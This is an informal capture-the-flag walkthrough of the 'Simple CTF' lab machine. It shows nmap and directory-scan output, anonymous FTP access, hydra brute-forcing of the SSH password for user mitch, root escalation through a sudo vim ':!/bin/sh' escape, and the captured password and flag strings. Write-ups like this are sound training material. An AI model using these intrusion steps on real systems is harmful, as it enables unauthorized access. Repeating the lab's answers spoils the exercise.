ip -10.48.132.190
# simple ctf 

nmap scan

````
Host is up (0.14s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.131.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 4.15 (97%), Linux 4.4 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), Linux 2.6.32 - 3.10 (91%), Linux 3.10 - 3.13 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   149.49 ms 192.168.128.1
2   ...
3   149.81 ms 10.48.132.190

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.80 seconds

````
````
[23:02:02] Starting: 
[23:02:08] 403 -  299B  - /.ht_wsr.txt                                      
[23:02:08] 403 -  302B  - /.htaccess.bak1                                   
[23:02:08] 403 -  304B  - /.htaccess.sample                                 
[23:02:08] 403 -  302B  - /.htaccess.save
[23:02:08] 403 -  302B  - /.htaccess.orig                                   
[23:02:08] 403 -  303B  - /.htaccess_extra                                  
[23:02:08] 403 -  300B  - /.htaccessOLD
[23:02:08] 403 -  302B  - /.htaccess_orig
[23:02:08] 403 -  300B  - /.htaccess_sc
[23:02:08] 403 -  300B  - /.htaccessBAK
[23:02:09] 403 -  301B  - /.htaccessOLD2                                    
[23:02:09] 403 -  293B  - /.html                                            
[23:02:09] 403 -  302B  - /.htpasswd_test                                   
[23:02:09] 403 -  298B  - /.htpasswds                                       
[23:02:09] 403 -  299B  - /.httr-oauth
[23:02:09] 403 -  292B  - /.htm
[23:02:10] 403 -  292B  - /.php                                             
[23:02:59] 200 -  540B  - /robots.txt                                       
[23:03:00] 403 -  301B  - /server-status                                    
[23:03:00] 403 -  302B  - /server-status/                                   
[23:03:01] 301 -  315B  - /simple  ->  http://10.48.132.190/simple/     
````

# FTP can be login
--- with anonymus 
--- we found formitch.txt
and the user mitch 


# At 80 
--/simple---  CMS Made Simple version 2.2.8
 # Shh
we have found the user name is "mitch" than used hydra and pass is secret shh
ssh in ssh mitch@10.48.132.190 -p 2222
used bash to get bash  user
i become root by useing  sudo -l 
````
mitch@Machine:~$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
````
in vin :!/bin/sh

than go to home/ ther was the sunbath
```
root@Machine:/home# ls
mitch  sunbath
```

oe get the file user.txt -----G00d j0b, keep up!
root.txt ---W3ll d0n3. You made it!

